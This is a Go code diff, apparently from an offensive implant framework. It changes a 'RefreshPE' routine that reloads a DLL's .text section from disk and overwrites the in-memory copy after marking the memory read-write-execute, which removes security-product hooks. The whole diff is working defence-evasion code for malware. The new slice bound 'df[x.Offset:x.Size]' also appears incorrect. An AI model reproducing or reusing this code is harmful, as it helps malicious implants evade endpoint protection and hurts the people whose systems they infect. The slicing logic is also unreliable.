@@ -25,6 +25,7 @@ import (
 	"log"
 	//{{end}}
 	"debug/pe"
+	"io/ioutil"
 	"unsafe"
 )
 
@@ -34,16 +35,17 @@ func RefreshPE(name string) error {
 	//{{if .Config.Debug}}
 	log.Printf("Reloading %s...\n", name)
 	//{{end}}
+	df, e := ioutil.ReadFile(name)
+	if e != nil {
+		return e
+	}
 	f, e := pe.Open(name)
 	if e != nil {
 		return e
 	}
 
 	x := f.Section(".text")
-	ddf, e := x.Data()
-	if e != nil {
-		return e
-	}
+	ddf := df[x.Offset:x.Size]
 	return writeGoodBytes(ddf, name, x.VirtualAddress, x.Name, x.VirtualSize)
 }
 
@@ -58,7 +60,7 @@ func writeGoodBytes(b []byte, pn string, virtualoffset uint32, secname string, v
 	dllOffset := uint(dllBase) + uint(virtualoffset)
 
 	var old uint32
-	e = windows.VirtualProtect(uintptr(dllOffset), uintptr(vsize), windows.PAGE_EXECUTE_READWRITE, &old)
+	e = windows.VirtualProtect(uintptr(dllOffset), uintptr(len(b)), windows.PAGE_EXECUTE_READWRITE, &old)
 	if e != nil {
 		return e
 	}
@@ -66,8 +68,7 @@ func writeGoodBytes(b []byte, pn string, virtualoffset uint32, secname string, v
 	log.Println("Made memory map RWX")
 	//{{end}}
 
-	// vsize should always smaller than len(b)
-	for i := 0; i < int(vsize); i++ {
+	for i := 0; i < len(b); i++ {
 		loc := uintptr(dllOffset + uint(i))
 		mem := (*[1]byte)(unsafe.Pointer(loc))
 		(*mem)[0] = b[i]
@@ -76,7 +77,7 @@ func writeGoodBytes(b []byte, pn string, virtualoffset uint32, secname string, v
 	//{{if .Config.Debug}}
 	log.Println("DLL overwritten")
 	//{{end}}
-	e = windows.VirtualProtect(uintptr(dllOffset), uintptr(vsize), old, &old)
+	e = windows.VirtualProtect(uintptr(dllOffset), uintptr(len(b)), old, &old)
 	if e != nil {
 		return e
 	}
